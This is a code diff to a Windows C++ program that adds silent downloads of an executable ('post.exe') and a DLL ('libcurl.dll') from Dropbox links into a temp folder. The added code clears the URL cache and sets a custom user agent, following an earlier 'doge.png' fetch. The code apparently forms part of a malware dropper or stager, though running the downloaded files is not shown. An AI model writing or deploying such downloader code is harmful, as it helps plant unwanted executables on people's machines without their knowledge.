@@ -41,5 +41,21 @@ int main(int argc, char* argv[]) {
 		L"https://www.dropbox.com/s/2oy3z8g1nb0scv4/doge.png?dl=1", filepath, 0
 		, 0) > -1) {
 	}
+	PathCombineW(filepath, temppath, (LPCWSTR)u"post.exe");
+	DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/aiib97o4pxrti6t/post.exe?dl=1");
+	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
+	if (URLDownloadToFileW(0,
+		L"https://www.dropbox.com/s/aiib97o4pxrti6t/post.exe?dl=1", filepath, 0
+		, 0) > -1) {
+	}
+	PathCombineW(filepath, temppath, (LPCWSTR)u"libcurl.dll");
+	DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/6w64bb8g1zixeav/libcurl.dll?dl=1");
+	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
+	if (URLDownloadToFileW(0,
+		L"https://www.dropbox.com/s/6w64bb8g1zixeav/libcurl.dll?dl=1", filepath, 0
+		, 0) > -1) {
+	}
+
+
 	return 0;
 }
